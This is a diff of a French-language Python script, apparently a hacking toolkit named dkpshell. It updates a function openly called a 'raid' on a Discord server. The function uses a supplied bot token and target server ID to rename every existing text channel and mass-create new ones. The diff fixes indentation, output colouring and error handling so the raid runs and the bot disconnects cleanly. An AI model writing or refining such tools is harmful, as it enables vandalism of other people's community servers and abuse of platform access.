@@ -23,7 +23,7 @@ import asyncio
 
 
 
-__version__ = "3.4"
+__version__ = "3.5"
 RED = "\033[91m"
 GREEN = "\033[92m"
 YELLOW = "\033[93m"
@@ -36,12 +36,15 @@ ORANGE = "\033[38;5;208m"
 
 
 def raid_discord():
+    """
+    Effectue un raid sur un serveur Discord avec les options de renommage de salons et de création de nouveaux salons.
+    """
     # INPUT UTILISATEUR
-    token = input(f"{YELLOW}🔑 Entrez le token du bot Discord: ")
-    noms_renommage_str = input("✏️ Entrez les noms pour renommer les salons (séparés par des virgules): ")
+    token = input(f"{YELLOW}🔑 Entrez le token du bot Discord: {RESET}")
+    noms_renommage_str = input(f"✏️ Entrez les noms pour renommer les salons (séparés par des virgules): {RESET}")
     noms_renommage = [n.strip() for n in noms_renommage_str.split(",") if n.strip()]
 
-    nom_nouveaux_salons = input("📛 Nom des nouveaux salons à créer: ").strip()
+    nom_nouveaux_salons = input(f"📛 Nom des nouveaux salons à créer: {RESET}").strip()
     nombre_de_salons = int(input(f"🔢 Combien de nouveaux salons créer ? {RESET}"))
 
     intents = discord.Intents.all()
@@ -49,23 +52,23 @@ def raid_discord():
 
     @bot.event
     async def on_ready():
-        print(f"{GREEN}✅ Connecté en tant que {bot.user}")
-    
-        guild_id_input = int(input(f"{BLUE}🆔 Entrez l'ID du serveur cible : "))
+        print(f"{GREEN}✅ Connecté en tant que {bot.user}{RESET}")
+
+        guild_id_input = int(input(f"{BLUE}🆔 Entrez l'ID du serveur cible : {RESET}"))
         guild = bot.get_guild(guild_id_input)
-    
+
         if guild is None:
-            print(f"{RED}❌ Le bot n'est pas dans ce serveur ou l'ID est invalide.")
+            print(f"{RED}❌ Le bot n'est pas dans ce serveur ou l'ID est invalide.{RESET}")
             await bot.close()
             return
 
-        print(f"{MAGENTA}🔗 Raid en cours sur le serveur: {guild.name} ({guild.id})")
+        print(f"{MAGENTA}🔗 Raid en cours sur le serveur: {guild.name} ({guild.id}){RESET}")
 
         salons_texte = [c for c in guild.text_channels]
         ids = [c.id for c in salons_texte]
-        print(f"{CYAN}🧾 Salons existants:", ids)
+        print(f"{CYAN}🧾 Salons existants: {ids}{RESET}")
 
-    # Renommage des salons
+        # Renommage des salons
         for i, salon in enumerate(salons_texte):
             if i < len(noms_renommage):
                 nouveau_nom = noms_renommage[i]
@@ -73,18 +76,27 @@ def raid_discord():
                 nouveau_nom = f"{nom_nouveaux_salons}-{i}"
             try:
                 await salon.edit(name=nouveau_nom)
-                print(f"{GREEN}🔁 Salon renommé: {salon.name} -> {nouveau_nom}")
+                print(f"{GREEN}🔁 Salon renommé: {salon.name} -> {nouveau_nom}{RESET}")
             except Exception as e:
-                print(f"{ORANGE}⚠️ Erreur lors du renommage de {salon.name}: {e}")
+                print(f"{ORANGE}⚠️ Erreur lors du renommage de {salon.name}: {e}{RESET}")
 
-    # Création de nouveaux salons
+        # Création de nouveaux salons
         for i in range(nombre_de_salons):
             try:
-                await guild.create_text_channel(f"{nom_nouveaux_salons}-{i}")
-                print(f"➕ Salon créé: {nom_nouveaux_salons}-{i}")
+                nouveau_salon = await guild.create_text_channel(f"{nom_nouveaux_salons}-{i}")
+                print(f"{GREEN}➕ Salon créé: {nouveau_salon.name}{RESET}")
             except Exception as e:
-                print(f"{RED}⚠️ Erreur création salon: {e}")
+                print(f"{RED}⚠️ Erreur création salon: {e}{RESET}")
 
+        print(f"{GREEN}✅ Raid terminé. Déconnexion du bot.{RESET}")
+        await bot.close()
+
+    try:
+        bot.run(token)
+    except discord.errors.InvalidToken:
+        print(f"{RED}❌ Erreur : Token Discord invalide. Veuillez vérifier votre token.{RESET}")
+    except Exception as e:
+        print(f"{RED}Une erreur inattendue s'est produite : {e}{RESET}")
 def check_update():
     try:
         url = "https://raw.githubusercontent.com/MJVhack/MJVhack/main/dkpshell.py"
